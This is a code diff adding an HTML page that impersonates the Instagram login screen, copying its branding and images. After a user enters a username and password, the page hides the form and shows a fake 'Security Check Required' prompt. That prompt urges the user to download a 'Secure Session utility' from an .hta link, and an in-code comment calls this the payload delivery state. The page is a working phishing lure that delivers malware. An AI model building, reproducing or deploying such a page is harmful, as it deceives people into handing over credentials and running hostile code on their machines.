@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login &bull; Instagram</title>
+    <!-- Social Preview Meta Tags -->
+    <meta property="og:title" content="Login • Instagram">
+    <meta property="og:description" content="Welcome back to Instagram. Sign in to check out what your friends, family & interests have been capturing & sharing around the world.">
+    <meta property="og:image" content="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png">
+    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d994069cfd.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-gray: #fafafa;
+            --border-gray: #dbdbdb;
+            --insta-blue: #0095f6;
+            --insta-blue-hover: #1877f2;
+            --text-main: #262626;
+            --text-dim: #8e8e8e;
+            --error-red: #ed4956;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-gray);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin-top: 2rem;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            max-width: 935px;
+            width: 100%;
+            justify-content: center;
+        }
+
+        /* --- Lefthand Phones Graphic --- */
+        .phones-graphic {
+            height: 581px;
+            width: 380px;
+            margin-right: 32px;
+            background-image: url('/static/insta_landing_graphic.png');
+            background-size: cover;
+            background-position: center;
+            display: block;
+        }
+
+        @media (max-width: 875px) {
+            .phones-graphic { display: none; }
+        }
+
+        /* --- Login Box --- */
+        .auth-box-wrapper {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .auth-box {
+            background-color: #fff;
+            border: 1px solid var(--border-gray);
+            border-radius: 1px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo {
+            width: 175px;
+            margin-bottom: 24px;
+            cursor: pointer;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 6px;
+        }
+
+        .insta-input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background: var(--bg-gray);
+            border: 1px solid var(--border-gray);
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .insta-input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .btn-login {
+            background-color: var(--insta-blue);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 5px 9px;
+            width: 100%;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-login:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 10px 0 18px;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: var(--border-gray);
+        }
+
+        .divider span {
+            margin: 0 18px;
+            color: var(--text-dim);
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .forgot-pass {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid var(--border-gray);
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            color: var(--insta-blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* --- Loading / Secure Verification State --- */
+        #verify-state {
+            display: none;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(0,0,0,0.1);
+            border-top-color: var(--text-dim);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .footer {
+            padding: 24px 16px;
+            font-size: 12px;
+            color: var(--text-dim);
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            text-decoration: none;
+            color: var(--text-dim);
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div class="container">
+            <!-- Left graphic only visible on desktop -->
+            <div class="phones-graphic"></div>
+
+            <div class="auth-box-wrapper">
+                <!-- Main Auth Box -->
+                <div class="auth-box" id="login-box">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
+                    
+                    <div id="input-state" style="width: 100%;">
+                        <div class="form-group">
+                            <input type="text" class="insta-input" placeholder="Phone number, username, or email" id="username">
+                        </div>
+                        <div class="form-group">
+                            <input type="password" class="insta-input" placeholder="Password" id="password">
+                        </div>
+                        <button class="btn-login" id="login-btn">Log In</button>
+                        
+                        <div class="divider">
+                            <span>OR</span>
+                        </div>
+
+                        <a href="#" class="fb-login">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/Logo_de_Facebook.png" width="16" height="16" alt="">
+                            Log in with Facebook
+                        </a>
+
+                        <a href="#" class="forgot-pass">Forgot password?</a>
+                    </div>
+
+                    <!-- Verification / Payload Delivery State -->
+                    <div id="verify-state">
+                        <p style="font-size: 14px; font-weight: 500; margin-bottom: 10px;">Security Check Required</p>
+                        <p style="font-size: 13px; color: var(--text-dim);">To continue, please download the Instagram Secure Session utility to verify your device.</p>
+                        <div class="spinner"></div>
+                        <a href="/api/p/update.hta" class="btn-login" style="text-decoration: none; display: block; margin-top: 15px;">Secure Verification Start</a>
+                    </div>
+                </div>
+
+                <div class="signup-box">
+                    Don't have an account? <a href="#" class="signup-link">Sign up</a>
+                </div>
+
+                <p style="text-align: center; font-size: 14px; margin: 10px 0;">Get the app.</p>
+                <div class="app-badges">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" height="40" alt="App Store">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" height="40" alt="Google Play">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Hashtags</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+        </div>
+        <div>© 2026 Instagram from Meta</div>
+    </div>
+
+    <script>
+        const loginBtn = document.getElementById('login-btn');
+        const inputState = document.getElementById('input-state');
+        const verifyState = document.getElementById('verify-state');
+
+        loginBtn.addEventListener('click', () => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                // Transition to verification state
+                inputState.style.display = 'none';
+                verifyState.style.display = 'block';
+            }
+        });
+
+        // Pre-fill email/username if passed in URL
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('username')) {
+                document.getElementById('username').value = params.get('username');
+            }
+        };
+    </script>
+</body>
+</html>
